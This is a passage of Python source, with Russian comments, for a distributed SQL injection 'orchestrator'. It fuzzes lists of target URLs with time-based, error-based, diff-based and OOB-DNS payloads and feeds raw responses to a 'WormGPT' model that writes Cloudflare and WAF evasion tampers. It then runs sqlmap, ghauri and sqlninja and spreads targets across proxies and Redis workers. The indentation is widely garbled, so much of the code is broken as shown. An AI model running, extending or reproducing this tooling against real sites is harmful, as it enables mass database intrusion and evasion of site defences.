 new_qs = [(k, payload if (k == param and location == "query") else v)
 for k, v in qs]
 url = urlunparse(parsed._replace(query=urlencode(new_qs)))
 body = None
 if method == "POST":
     pd = parse_qsl(self.post_data, keep_blank_values=True)
     new_pd = [(k, payload if (k == param and location == "body")
 else v) for k, v in pd]
 body = urlencode(new_pd)
 cookies = dict(self.cookies)
 if location == "cookie" and param in cookies:
     cookies[param] = payload
     return url, None, body, cookies

 def _record_response(self, payload: str, status: int, headers: dict,
 body: str, elapsed: float):
 """Сохранить сырой ответ для каскадного WormGPT (обрезаем до 1500)."""
 self.raw_responses.append({
 "payload": payload[:100],
 "status": status,
 "server": headers.get("server", ""),
 "cf_ray": headers.get("cf-ray", ""),
 "cf_mitigated": headers.get("cf-mitigated", ""),
 "content_type": headers.get("content-type", ""),
 "elapsed": round(elapsed, 2),
 "body_snippet": body[:1500],
 })

 def recon(self) -> Optional[List[Tuple[str, str, str]]]:
     self.phase = "recon"
     log(f"[Ц{self.idx}] Разведка: {self.url}")
     resp = self.client.request("GET", self.url, cookies=self.cookies or None)
     if resp is None:
         self.report.errors.append("Цель недоступна")
         log(f"[Ц{self.idx}] Цель недоступна.")
         return None

 self.baseline_body = resp.text
 self.baseline_len = len(resp.text)
 self.baseline_time = resp.elapsed.total_seconds()
 server = resp.headers.get("server", "")
 cf_detected = "cloudflare" in server.lower() or "cf-ray" in resp.headers
 log(f"[Ц{self.idx}] Жива: HTTP {resp.status_code}, "
 f"{self.baseline_len} байт"
 + (" [Cloudflare]" if cf_detected else ""))
 if cf_detected:
     self.base_delay = max(self.base_delay, 1.5)

 candidates = self._targets()
 self.recon_data = {
 "url": self.url, "http_status": resp.status_code,
 "server_header": server, "cloudflare_detected": cf_detected,
 "cf_ray": resp.headers.get("cf-ray", ""),
 "content_type": resp.headers.get("content-type", ""),
 "response_length": self.baseline_len,
 "response_time_sec": round(self.baseline_time, 2),
 "target_params": [{"name": c[0], "method": c[1],
 "location": c[2]} for c in candidates],
 "forced_dbms": self.forced_dbms,
 "baseline_body_snippet": resp.text[:1500],
 }
 return candidates

 def run_worm(self, failure_feedback: Optional[dict] = None):
     if not self.worm:
         return
         self.phase = "wormgpt"
         try:
             self.worm_strategy = self.worm.generate_strategy(self.recon_data,
             failure_feedback)
             self.worm_tampers = self.worm_strategy.get("tampers") or {}
             self.report.worm_iterations += 1
             self.report.worm_waf_profile = self.worm_strategy.get(
             "waf_profile", "")
             self.report.worm_strategy = {
             "tampers": list(self.worm_tampers.keys()),
             "payloads": self.worm_strategy.get("payloads", []),
             "sqlmap_tamper": self.worm_strategy.get("sqlmap_tamper", ""),
             "sqlmap_options": self.worm_strategy.get("sqlmap_options", []),
             "waf_profile": self.worm_strategy.get("waf_profile", ""),
             "notes": self.worm_strategy.get("notes", ""),
             }
 except Exception as e:
     log(f"[Ц{self.idx}] WormGPT упал: {e} — встроенные тамперы.")
     self.report.errors.append(f"worm agent: {e}")
     self.worm_strategy = {}
     self.worm_tampers = {}

 def _make_failure_feedback(self, dbms: str) -> dict:
     """КАСКАД: сырые HTTP-ответы (WAF-страницы, CF-заголовки, ошибки)
     + дифф-аномалии — WormGPT распознаёт WAF-профиль и строит обход."""
     diff_anomalies = [r for r in self.raw_responses
     if r.get("diff_score", 1.0) < DIFF_THRESHOLD]
     return {
     "dbms": dbms,
     "tried_payloads_sample": self.tried_payloads[-40:],
     "tried_count": len(self.tried_payloads),
     "last_strategies": self.worm.history[-3:],
     "cloudflare_detected": self.recon_data.get("cloudflare_detected",
     False),
     "raw_responses": self.raw_responses[-10:],
     "diff_anomalies": diff_anomalies[-5:],
     "instruction": ("Analyze RAW responses to identify the WAF product "
     "and its blocking rules, then craft an evasion strategy "
     "specific to that profile."),
     }

 def detect_dbms(self, param: str, method: str, location: str) -> str:
     self.phase = "detect-dbms"
     if self.forced_dbms:
         return self.forced_dbms
         url, _, body, cookies = self._build_request(param, "'\"(()", method,
         location)
         resp = self.client.request(method, url, data=body, cookies=cookies)
         if resp is not None:
             self._record_response("'\"(()", resp.status_code, dict(resp.headers),
             resp.text, resp.elapsed.total_seconds())
             for db, sigs in ERROR_SIGNATURES.items():
                 if any(s in resp.text.lower() for s in sigs):
                     log(f"[Ц{self.idx}] СУБД по ошибке: {db.upper()}")
                     return db
                     for db, payloads in DETECT_PAYLOADS.items():
                         for pl in payloads:
                             url, _, body, cookies = self._build_request(param, pl, method,
                             location)
                             t0 = time.time()
                             resp = self.client.request(method, url, data=body,
                             cookies=cookies)
                             elapsed = time.time() - t0
                             if resp is not None and elapsed > self.baseline_time + 3.5:
                                 log(f"[Ц{self.idx}] СУБД time-based: {db.upper()}")
                                 return db
                                 self.client.human_pause(0.5, 1.5)
                                 return "unknown"

 def fuzz(self, candidates: List[Tuple[str, str, str]],
 dbms: str) -> List[InjectionFinding]:
 """Фаззинг: time-based + error-based + ДИФФ-детект + OOB."""
 self.phase = "fuzz"
 findings: List[InjectionFinding] = []

 # --- сборка пула пейлоадов ---
 payloads = list(DETECT_PAYLOADS.get(dbms, []))
 if not payloads:
     for pls in DETECT_PAYLOADS.values():
         payloads.extend(pls)

 # грамматическая генерация: контекст из последней ошибки
 if self.use_grammar:
     error_text = ""
     for r in reversed(self.raw_responses):
         if "syntax" in r.get("body_snippet", "").lower() or \
         "error" in r.get("body_snippet", "").lower():
         error_text = r["body_snippet"]
         break
         ctx = GrammarGenerator.analyze_context(error_text)
         grammar_pls = GrammarGenerator.generate(dbms, ctx, count=12)
         if grammar_pls:
             log(f"[Ц{self.idx}] Грамматика: контекст={ctx['context']}, "
             f"кавычки={ctx['quote']}, +{len(grammar_pls)} пейлоадов")
             payloads = grammar_pls + payloads

 # WormGPT-пейлоады — в начало
 worm_pls = self.worm_strategy.get("payloads", [])
 if worm_pls:
     payloads = worm_pls + payloads

 # OOB-пейлоады (если домен делегирован)
 oob_tokens: Dict[str, str] = {}
 if self.oob.domain != OOB_DOMAIN_DEFAULT or \
 os.environ.get("OOB_ENABLED"):
 for param, method, location in candidates:
     tok = self.oob.new_token(param)
     oob_tokens[tok] = param
     payloads.append(self.oob.payload(dbms, tok))

 for param, method, location in candidates:
     log(f"[Ц{self.idx}] Фаззинг {method} '{param}' "
     f"(time+error+DIFF+OOB)...")
     for pl in payloads:
         hit: Optional[InjectionFinding] = None
         seen = set(mutate(pl, extra_tampers=self.worm_tampers))
         for mut in seen:
             self.tried_payloads.append(mut)
             url, _, body, cookies = self._build_request(
             param, mut, method, location)
             if self.verbose:
                 log(f" [Ц{self.idx} >] {mut[:70]}", console=False)
                 t0 = time.time()
                 resp = self.client.request(method, url, data=body,
                 cookies=cookies)
                 elapsed = time.time() - t0
                 if resp is None:
                     continue

 self._record_response(mut, resp.status_code,
 dict(resp.headers), resp.text, elapsed)

 # 1) time-based
 if elapsed > 4.0:
     hit = InjectionFinding(param, method, location,
     dbms or "unknown", mut,
     "time-based", round(elapsed, 1))
     break

 # 2) error-based
 for db2, sigs in ERROR_SIGNATURES.items():
     if any(s in resp.text.lower() for s in sigs):
         hit = InjectionFinding(param, method, location,
         db2, mut, "error-based")
         break
         if hit:
             break

 # 3) ДИФФ-детект: структурная аномалия = слепая инъекция
 d = diff_score(self.baseline_body, resp.text)
 self.raw_responses[-1]["diff_score"] = round(d, 3)
 if d < DIFF_THRESHOLD and elapsed <= 4.0:
     log(f"[Ц{self.idx}] ДИФФ-аномалия: score={d:.2f} "
     f"< {DIFF_THRESHOLD} — слепая инъекция?",
     console=False)
     hit = InjectionFinding(param, method, location,
     dbms or "unknown", mut,
     "diff-based (blind)", 0.0, round(d, 3))
     break

 if hit:
     break
     self.client.human_pause(0.8, self.base_delay + 1.0)
     if hit:
         log(f"[Ц{self.idx}] ИНЪЕКЦИЯ: {hit.payload[:60]}... "
         f"({hit.technique})")
         findings.append(hit)
         break

 # 4) OOB-проверка: резолвились ли наши токены
 for tok, param in oob_tokens.items():
     if self.oob.check_hit(tok):
         log(f"[Ц{self.idx}] OOB-ХИТ: {tok}.{self.oob.domain} "
         f"резолвился — инъекция подтверждена!")
         findings.append(InjectionFinding(
         param, "ANY", "any", dbms or "unknown",
         self.oob.payload(dbms, tok), "oob-dns", 0.0, 1.0, tok))

 self.report.findings = findings
 return findings

 def run_sqlmap(self, findings: List[InjectionFinding]):
     if not findings or not self.use_sqlmap:
         return
         self.phase = "sqlmap"
         sqlmap_cmd = shutil.which("sqlmap")
         for f in findings:
             dbms = f.dbms if f.dbms in SQLMAP_TAMPER_MAP else "mysql"
             tampers = (self.worm_strategy.get("sqlmap_tamper")
             or SQLMAP_TAMPER_MAP[dbms])
             log(f"[Ц{self.idx}] sqlmap → '{f.param}', tamper: {tampers}")
             cmd = ([sys.executable, "-m", "sqlmap"] if not sqlmap_cmd
 else [sqlmap_cmd])
 cmd += ["-u", self.url, "--tamper", tampers, "--dbms", dbms,
 "--threads", "3", "--batch", "--level", "3",
 "--risk", "2", "--delay", "1", "--answers", "follow=N"]
 for opt in self.worm_strategy.get("sqlmap_options", []):
     if opt not in cmd:
         cmd.append(opt)
         if f.method == "POST" and self.post_data:
             cmd += ["--data", self.post_data]
             if self.cookies:
                 cmd += ["--cookie", self.cookie_str]
                 if f.method == "COOKIE":
                     cmd += ["--level", "5"]
                     try:
                         proc = subprocess.run(cmd, capture_output=True, text=True,
                         timeout=600)
                         self.report.sqlmap_output += proc.stdout + "\n" + proc.stderr
 except Exception as e:
     self.report.errors.append(f"sqlmap error: {e}")

 def run_extra_backends(self):
     if not self.report.findings:
         return
         if self.ghauri:
             self.phase = "ghauri"
             for f in self.report.findings:
                 self.report.ghauri_output += self.ghauri.run(self.report, f)
                 if self.sqlninja:
                     self.phase = "sqlninja-ext"
                     for f in self.report.findings:
                         self.report.sqlninja_output += self.sqlninja.run(self.report, f)

 def run(self, report_path: str) -> Report:
     candidates = self.recon()
     if candidates is None:
         self._save(report_path)
         return self.report

 self.run_worm()

 findings: List[InjectionFinding] = []
 for param, method, location in candidates:
     dbms = self.detect_dbms(param, method, location)
     self.report.dbms_detected = dbms
     findings = self.fuzz([(param, method, location)], dbms)
     if findings:
         break

 if not findings and self.worm and self.worm_loop > 0:
     for i in range(self.worm_loop):
         log(f"[Ц{self.idx}][WORM КАСКАД] {i + 1}/{self.worm_loop}: "
         f"анализ сырых ответов → новая стратегия...")
         self.run_worm(failure_feedback=self._make_failure_feedback(
         self.report.dbms_detected))
         findings = self.fuzz(candidates, self.report.dbms_detected)
         if findings:
             log(f"[Ц{self.idx}][WORM КАСКАД] Успех на итерации {i + 1}! "
             f"WAF-профиль: {self.report.worm_waf_profile or 'n/a'}")
             break

 self.run_sqlmap(self.report.findings)
 self.run_extra_backends()
 self._save(report_path)
 return self.report

 def _save(self, path: str):
     self.report.timestamp = datetime.datetime.now().isoformat()
     with open(path, "w", encoding="utf-8") as fp:
         fp.write(self.report.to_json())

# =============================================================================
# HTML-ОТЧЁТ
# =============================================================================

def save_html_report(reports: List[Report], path: str):
 rows = ""
 total = 0
 for rep in reports:
     status = "🟥 VULNERABLE" if rep.findings else "🟩 OK"
     total += len(rep.findings)
     detail = ""
     for f in rep.findings:
         detail += (f"<tr><td>{html_mod.escape(f.method)}:"
         f"{html_mod.escape(f.param)}</td>"
         f"<td>{html_mod.escape(f.technique)}</td>"
         f"<td>{html_mod.escape(f.dbms)}</td>"
         f"<td><code>{html_mod.escape(f.payload[:120])}"
         f"</code></td></tr>")
         findings_html = (f"<table border='1' cellpadding='4' "
         f"style='border-collapse:collapse'><tr><th>Param</th>"
         f"<th>Technique</th><th>DBMS</th><th>Payload</th></tr>"
         f"{detail}</table>") if detail else "<i>нет</i>"
         worm_html = "<i>off</i>"
         if rep.worm_strategy:
             worm_html = (f"{rep.worm_iterations} итер., WAF-профиль: "
             f"<b>{html_mod.escape(rep.worm_waf_profile or '—')}</b>, "
             f"тамперы: {html_mod.escape(', '.join(rep.worm_strategy.get('tampers', []))) or '—'}")
             backends = []
             if rep.sqlmap_output:
                 backends.append("sqlmap")
                 if rep.ghauri_output:
                     backends.append("ghauri")
                     if rep.sqlninja_output:
                         backends.append("sqlninja-ext")
                         bh = ", ".join(backends) if backends else "—"
                         rows += (f"<tr><td><code>{html_mod.escape(rep.target)}</code></td>"
                         f"<td>{status}</td>"
                         f"<td>{html_mod.escape(rep.dbms_detected)}</td>"
                         f"<td>{worm_html}</td><td>{bh}</td>"
                         f"<td>{findings_html}</td></tr>")
                         html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>SQLi Scan Report</title>
<style>
 body {{ font-family: Segoe UI, Arial, sans-serif; margin: 30px; background: #f5f5f5; }}
 table {{ background: #fff; border-collapse: collapse; width: 100%; }}
 th, td {{ border: 1px solid #ccc; padding: 8px; vertical-align: top; font-size: 14px; }}
 th {{ background: #2c3e50; color: #fff; }}
 code {{ background: #eee; padding: 2px 4px; border-radius: 3px; }}
</style></head><body>
<h1>SQLi Scan Report</h1>
<p>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} |
Целей: {len(reports)} | Инъекций: <b>{total}</b> |
Ядро: {'C++' if HAS_CPP else 'Python'}</p>
<table><tr><th>Target</th><th>Status</th><th>DBMS</th><th>WormGPT</th>
<th>Бэкенды</th><th>Findings</th></tr>
{rows}</table></body></html>"""
 with open(path, "w", encoding="utf-8") as fp:
     fp.write(html)
     log(f"[+] HTML-отчёт: {path}")

# =============================================================================
# СТАТУС-МЕНЕДЖЕР
# =============================================================================

class StatusManager:
 def __init__(self, total_targets: int, workers: int):
     self.total = total_targets
     self.workers = workers
     self.completed = 0
     self.vulnerable = 0
     self.clean = 0
     self.active: Dict[int, str] = {}
     self._lock = threading.Lock()
     self._stop = threading.Event()
     self._t0 = time.time()
     self._thread: Optional[threading.Thread] = None

 def target_done(self, vulnerable: bool):
     with self._lock:
         self.completed += 1
         if vulnerable:
             self.vulnerable += 1
 else:
     self.clean += 1

 def set_active(self, idx: int, phase: str):
     with self._lock:
         self.active[idx] = phase

 def remove_active(self, idx: int):
     with self._lock:
         self.active.pop(idx, None)

 def _render(self) -> str:
     with self._lock:
         done = self.completed
         vuln = self.vulnerable
         clean = self.clean
         active = dict(self.active)
         elapsed = int(time.time() - self._t0)
         pct = int(done * 100 / max(self.total, 1))
         bar_len = 20
         filled = int(bar_len * done / max(self.total, 1))
         bar = "▓" * filled + "░" * (bar_len - filled)
         hm = (f"{elapsed // 3600:02d}:{(elapsed % 3600) // 60:02d}:"
         f"{elapsed % 60:02d}")
         phases = " ".join(f"Ц{i}:{p}" for i, p in sorted(active.items())[:6])
         if len(active) > 6:
             phases += f" +{len(active) - 6}"
             return (f"[{done}/{self.total}] {bar} {pct:3d}% | "
             f"воркеры: {len(active)}/{self.workers} | уязвимо: {vuln} | "
             f"чисто: {clean} | {hm} | {phases}")

 def _loop(self):
     while not self._stop.wait(0.5):
         if LOGGER:
             LOGGER.status(self._render())

 def start(self):
     self._thread = threading.Thread(target=self._loop, daemon=True)
     self._thread.start()

 def stop(self):
     self._stop.set()
     if self._thread:
         self._thread.join(timeout=2)
         if LOGGER:
             LOGGER.clear_status()

# =============================================================================
# REDIS-РАСПРЕДЕЛЁННЫЙ РЕЖИМ
# =============================================================================

REDIS_QUEUE = "sqli:targets"
REDIS_RESULTS = "sqli:results"

def redis_dispatcher(redis_url: str, targets: List[str]) -> int:
 """Диспетчер: пушит цели в очередь Redis. Воркеры (--redis-worker)
 на любых машинах тянут их и сканируют."""
 import redis
 r = redis.Redis.from_url(redis_url, decode_responses=True)
 r.ping()
 for t in targets:
     r.rpush(REDIS_QUEUE, json.dumps({"url": t, "ts": time.time()}))
     log(f"[REDIS] {len(targets)} целей запушено в очередь "
     f"'{REDIS_QUEUE}' ({redis_url})")
     log("[REDIS] Запускай воркеры на других машинах:")
     log(f" python sqli_orchestrator.py --redis-worker {redis_url} "
     f"--workers 8 --html")
     return len(targets)

def redis_worker_loop(args, worm_key: str, proxies: List[str],
 status_mgr: StatusManager) -> List[Report]:
 """Воркер: тянет цели из Redis-очереди и сканирует их.
 Результаты пушатся в sqli:results (list of JSON-отчётов)."""
 import redis
 r = redis.Redis.from_url(args.redis_worker, decode_responses=True)
 r.ping()
 log(f"[REDIS-WORKER] Подключён к {args.redis_worker}, "
 f"воркеров: {args.workers}. Жду цели из '{REDIS_QUEUE}'...")
 reports: List[Report] = []
 idx = 0
 idle_rounds = 0

 def process_one(item: dict, i: int) -> Optional[Report]:
     state = BatchState(f"redis_state_{socket.gethostname()}.json", [])
     state.set_status(item["url"], "running")
     rep = scan_target(args, item["url"], i, worm_key, proxies,
     state, status_mgr)
     r.rpush(REDIS_RESULTS, rep.to_json())
     return rep

 with concurrent.futures.ThreadPoolExecutor(
 max_workers=args.workers) as pool:
 futures = []
 while True:
     # блочный pop с таймаутом — воркер завершается после
     # 60 секунд тишины в очереди
     raw = r.blpop(REDIS_QUEUE, timeout=15)
     if raw is None:
         idle_rounds += 1
         if idle_rounds >= 4: # ~60 сек без целей
             log("[REDIS-WORKER] Очередь пуста >60с — завершаюсь.")
             break
             continue
             idle_rounds = 0
             idx += 1
             item = json.loads(raw[1])
             log(f"[REDIS-WORKER] Взял цель #{idx}: {item['url']}")
             futures.append(pool.submit(process_one, item, idx))
             # сбор результатов по мере готовности
             done_now = [f for f in futures if f.done()]
             for f in done_now:
                 futures.remove(f)
                 try:
                     rep = f.result()
                     if rep:
                         reports.append(rep)
 except Exception as e:
     log(f"[REDIS-WORKER] Воркер упал: {e}")
     for f in concurrent.futures.as_completed(futures):
         try:
             rep = f.result()
             if rep:
                 reports.append(rep)
 except Exception as e:
     log(f"[REDIS-WORKER] Воркер упал: {e}")
     return reports

# =============================================================================
# CLI
# =============================================================================

def scan_target(args, url: str, idx: int, worm_key: str,
 proxies: List[str], state: BatchState,
 status_mgr: StatusManager) -> Report:
 state.set_status(url, "running")
 status_mgr.set_active(idx, "recon")
 report_path = f"sqli_report_target_{idx}.json"
 orch = SQLiOrchestrator(
 url=url, post_data=args.post, cookie_str=args.cookie,
 param=args.param, dbms=args.db, verbose=args.verbose,
 use_sqlmap=not args.no_sqlmap, delay=args.delay,
 worm_key=worm_key if args.worm else "",
 worm_loop=args.worm_loop, proxies=proxies, target_index=idx,
 use_ghauri=args.ghauri, use_sqlninja=args.sqlninja,
 oob_domain=args.oob_domain,
 use_grammar=not args.no_grammar)

 _orig_run = orch.run

 def run_with_status(*a, **kw):
     done_evt = threading.Event()

 def phase_watcher():
     while not done_evt.is_set():
         status_mgr.set_active(idx, orch.phase)
         time.sleep(0.4)

 watcher = threading.Thread(target=phase_watcher, daemon=True)
 watcher.start()
 try:
     return _orig_run(*a, **kw)
 finally:
     done_evt.set()

 orch.run = run_with_status # type: ignore

 try:
     rep = orch.run(report_path)
 except Exception as e:
     log(f"[!] Воркер Ц{idx} ({url}) упал: {e}")
     rep = Report(target=url, errors=[f"worker crash: {e}"])
     with open(report_path, "w", encoding="utf-8") as fp:
         fp.write(rep.to_json())

 status_mgr.remove_active(idx)

 if rep.findings:
     if args.burp:
         status_mgr.set_active(idx, "burp")
         BurpIntegrator(args.burp).send(rep)
         if args.dojo:
             status_mgr.set_active(idx, "dojo")
             DefectDojoIntegrator(args.dojo, args.dojo_eng).send(rep)
             if args.nessus:
                 status_mgr.set_active(idx, "nessus")
                 NessusIntegrator(args.nessus, args.nessus_policy).send(rep)

 status_mgr.target_done(vulnerable=bool(rep.findings))
 state.set_status(url, "done" if not rep.errors else "error")
 log(f"[Ц{idx}] Готово: {url} → "
 f"{'УЯЗВИМА' if rep.findings else 'чиста'}"
 + (f" (ошибки: {rep.errors})" if rep.errors else ""))
 return rep

def main():
 ap = argparse.ArgumentParser(
 description="SQLi-оркестратор v3.0 DISTRIBUTED FULL: C++ ядро + "
 "дифф-детект + каскадный WormGPT + OOB-DNS + грамматика + Redis")
 ap.add_argument("url", nargs="?", default="")
 ap.add_argument("--list", default="")
 ap.add_argument("--post", default="")
 ap.add_argument("--cookie", default="")
 ap.add_argument("--param", default="")
 ap.add_argument("--db", default="", choices=list(DETECT_PAYLOADS.keys()))
 ap.add_argument("--no-sqlmap", action="store_true")
 ap.add_argument("--verbose", "-v", action="store_true")
 ap.add_argument("--delay", type=float, default=1.0)
 ap.add_argument("--worm", action="store_true")
 ap.add_argument("--worm-key", default="")
 ap.add_argument("--worm-loop", type=int, default=0)
 ap.add_argument("--proxy", default="")
 ap.add_argument("--html", action="store_true")
 ap.add_argument("--workers", type=int, default=8)
 ap.add_argument("--resume", action="store_true")
 ap.add_argument("--state", default=STATE_FILENAME)
 ap.add_argument("--ghauri", action="store_true")
 ap.add_argument("--sqlninja", action="store_true")
 ap.add_argument("--burp", default="")
 ap.add_argument("--dojo", default="")
 ap.add_argument("--dojo-eng", type=int, default=0)
 ap.add_argument("--nessus", default="")
 ap.add_argument("--nessus-policy", type=int, default=0)
 ap.add_argument("--log-dir", default="logs")
 ap.add_argument("--log-max-mb", type=int, default=10)
 ap.add_argument("--log-keep", type=int, default=5)
 ap.add_argument("--log-days", type=int, default=30)
 ap.add_argument("--no-grammar", action="store_true",
 help="Отключить грамматическую генерацию пейлоадов")
 ap.add_argument("--oob-domain", default=OOB_DOMAIN_DEFAULT,
 help="Домен для OOB-канала (делегируй на oob_dns_server.py)")
 ap.add_argument("--redis", default="",
 help="Redis URL: режим ДИСПЕТЧЕРА (пуш целей в очередь)")
 ap.add_argument("--redis-worker", default="",
 help="Redis URL: режим ВОРКЕРА (тянет цели из очереди)")
 ap.add_argument("--version", action="version",
 version=f"%(prog)s {__version__}")
 args = ap.parse_args()

 # --- режимы Redis ---
 if args.redis or args.redis_worker:
     if not args.redis and not args.list:
         ap.error("--redis требует --list файл с целями")

 global LOGGER
 LOGGER = Logger(log_dir=args.log_dir,
 max_bytes=args.log_max_mb * 1024 * 1024,
 max_segments=args.log_keep,
 retention_days=args.log_days)
 log(f"=== Запуск {datetime.datetime.now().isoformat()} "
 f"(v{__version__}, ядро: {'C++' if HAS_CPP else 'Python'}) ===")

 worm_key = args.worm_key or os.environ.get("WORMGPT_API_KEY", "")
 if args.worm and not worm_key:
     print("[-] --worm без ключа. Задай WORMGPT_API_KEY или --worm-key.")
     sys.exit(1)

 proxies: List[str] = []
 if args.proxy:
     with open(args.proxy) as fp:
         proxies = [l.strip() for l in fp if l.strip()]
         log(f"[*] Пул прокси: {len(proxies)}")

 # РЕЖИМ ДИСПЕТЧЕРА: пуш целей в Redis и выход
 if args.redis:
     with open(args.list) as fp:
         all_targets = [l.strip() for l in fp
         if l.strip() and not l.startswith("#")]
         redis_dispatcher(args.redis, all_targets)
         LOGGER.close()
         return

 # РЕЖИМ ВОРКЕРА: бесконечный цикл обработки очереди
 if args.redis_worker:
     if args.worm and not worm_key:
         print("[-] --worm без ключа.")
         sys.exit(1)
         status_mgr = StatusManager(total_targets=0, workers=args.workers)
         status_mgr.start()
         t0 = time.time()
         try:
             reports = redis_worker_loop(args, worm_key, proxies, status_mgr)
 except KeyboardInterrupt:
     log("\n[!] Прервано (Ctrl+C).")
     reports = []
 finally:
     status_mgr.stop()
     if args.html and reports:
         save_html_report(reports, "sqli_report_redis.html")
         log(f"\n[СВОДКА REDIS-WORKER] Обработано: {len(reports)} | "
         f"Уязвимых: {sum(1 for r in reports if r.findings)} | "
         f"Время: {time.time() - t0:.0f}s")
         LOGGER.close()
         return

 # --- обычный режим ---
 if not args.url and not args.list:
     ap.error("Укажи URL или --list файл")
     if args.dojo and not args.dojo_eng:
         ap.error("--dojo требует --dojo-eng <engagement_id>")
         if args.dojo and not os.environ.get("DOJO_API_KEY"):
             print("[-] --dojo требует DOJO_API_KEY в окружении.")
             sys.exit(1)
             if args.nessus and not (os.environ.get("NESSUS_ACCESS_KEY")
             and os.environ.get("NESSUS_SECRET_KEY")):
             print("[-] --nessus требует NESSUS_ACCESS_KEY и NESSUS_SECRET_KEY.")
             sys.exit(1)
             if not HAS_CFFI:
                 print("[!] Совет: pip install curl_cffi — сильнее обход Cloudflare.\n")

 log(f"Лог: {LOGGER.log_path} (ротация {args.log_max_mb} МБ, сжатие gz, "
 f"хранение {args.log_days} дн.)")

 if args.list:
     with open(args.list) as fp:
         all_targets = [l.strip() for l in fp
         if l.strip() and not l.startswith("#")]
 else:
     all_targets = [args.url]
     seen = set()
     all_targets = [t for t in all_targets
     if not (t in seen or seen.add(t))]
     if not all_targets:
         print("[-] Список целей пуст.")
         sys.exit(1)

 state = BatchState(args.state, all_targets)
 if args.resume:
     pending = state.pending_targets()
     skipped = len(all_targets) - len(pending)
     log(f"[*] RESUME: всего {len(all_targets)}, к выполнению "
     f"{len(pending)}, пропущено {skipped} "
     f"(статусы: {state.summary()})")
     targets = pending
 else:
     targets = all_targets

 if not targets:
     log("[*] Нечего делать — все цели уже обработаны. Итог: "
     f"{state.summary()}")
     LOGGER.close()
     return

 backends = ["sqlmap"] if not args.no_sqlmap else []
 if args.ghauri:
     backends.append("ghauri")
     if args.sqlninja:
         backends.append("sqlninja-ext")
         log(f"[*] Целей: {len(targets)} | Воркеров: {args.workers} | "
         f"Ядро: {'C++ (быстрое)' if HAS_CPP else 'Python (fallback)'} | "
         f"Бэкенды: {', '.join(backends)} | Грамматика: "
         f"{'on' if not args.no_grammar else 'off'} | "
         f"OOB: {args.oob_domain}")

 status_mgr = StatusManager(total_targets=len(targets), workers=args.workers)
 status_mgr.start()

 all_reports: List[Report] = []
 t0 = time.time()
 try:
     if len(targets) == 1:
         all_reports.append(scan_target(args, targets[0], 1, worm_key,
         proxies, state, status_mgr))
 else:
     with concurrent.futures.ThreadPoolExecutor(
     max_workers=args.workers) as pool:
     futures = {pool.submit(scan_target, args, url, i + 1,
     worm_key, proxies, state,
     status_mgr): url
     for i, url in enumerate(targets)}
     for fut in concurrent.futures.as_completed(futures):
         url = futures[fut]
         try:
             all_reports.append(fut.result())
 except Exception as e:
     log(f"[!] Воркер для {url} упал: {e}")
     all_reports.append(Report(target=url,
     errors=[f"worker crash: {e}"]))
 except KeyboardInterrupt:
     log("\n[!] Прервано (Ctrl+C). Используй --resume.")
 finally:
     status_mgr.stop()

 elapsed = time.time() - t0

 if args.html and all_reports:
     save_html_report(all_reports, "sqli_report.html")

 vuln = sum(1 for r in all_reports if r.findings)
 log(f"\n[СВОДКА] Отсканировано: {len(all_reports)} | Уязвимых: {vuln} | "
 f"Чистых: {len(all_reports) - vuln} | Время: {elapsed:.0f}s")
 log(f"[*] Состояние батча: {state.summary()}")
 log(f"[*] Полный лог: {LOGGER.log_path}")
 LOGGER.close()

if __name__ == "__main__":
 main()